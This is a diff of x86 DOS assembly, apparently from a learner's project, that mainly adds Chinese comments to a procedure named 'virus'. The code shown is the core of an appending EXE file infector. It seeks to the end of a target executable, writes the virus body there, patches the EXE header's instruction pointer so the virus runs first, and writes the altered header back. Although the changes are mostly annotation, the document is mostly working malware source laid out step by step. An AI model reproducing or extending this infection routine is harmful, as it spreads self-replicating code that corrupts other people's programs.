@@ -94,11 +94,12 @@ virus proc
               xor  cx,cx                       ;位移量清零
               xor  dx,dx
               mov  ax,4202h                    ;42号功能，AL=方式0-正向1-相对2-反向
+                                                ;参数：BX=文件号,CX:DX=移动的位移量
                                                 ;移动指针到文件尾，病毒代码插入到尾部
                                                 ;返回：CF=0成功,DX:AX=新的文件指针
               int  21h
     ;--------------------------------------------------以下未看
-              push ax
+              push ax                           ;存一下AA.exe文件末尾的位置
               sub  ax,200h
               mov  cx,ax
               mov  ax,[si+16h]                 ;16-17H:表示 b.exe 被载入后 CS 的相对偏移地址是
@@ -106,13 +107,14 @@ virus proc
               mov  dx,10h
               mul  dx
               sub  cx,ax
-              mov  word ptr [si+14h],cx        ;这里我是试出来病毒代码的内存地址的；；修改ip指向，程序入口为病毒代码
+              mov  word ptr [si+14h],cx        ;这里我是试出来病毒代码的内存地址的；修改ip指向，程序入口为病毒代码
               pop  ax
              
               lea  dx,[bp+offset start]        ;写入代码
               lea  cx,[bp+offset theend]
               sub  cx,dx
-              mov  ah,40h
+              mov  ah,40h                       ;40号功能，写文件或者设备
+                                                ;参数:DS:DX=缓冲区首址, BX=文件号，CX=写入的字节数。
               int  21h
 
               mov  ax,4202h                    ;计算新文件长度,修改头
@@ -126,14 +128,13 @@ virus proc
               mov  word ptr [si+2],dx
               mov  word ptr [si+4],ax
     
-              mov  ax,4200h                    ;42号功能，AL=方式0-正向1-相对2-反向
-                                                ;移动指针到文件尾，病毒代码插入到尾部
+              mov  ax,4200h                     ;42号功能，AL=方式0-正向1-相对2-反向
                                                 ;返回：CF=0成功,DX:AX=新的文件指针
-              xor  cx,cx                        ; 位移为0
+              xor  cx,cx                        ;位移为0
               xor  dx,dx
               int  21h
 
-              mov  ah,40h
+              mov  ah,40h                        ;将新的头文件写入
               mov  dx,si
               mov  cx,30h
               int  21h
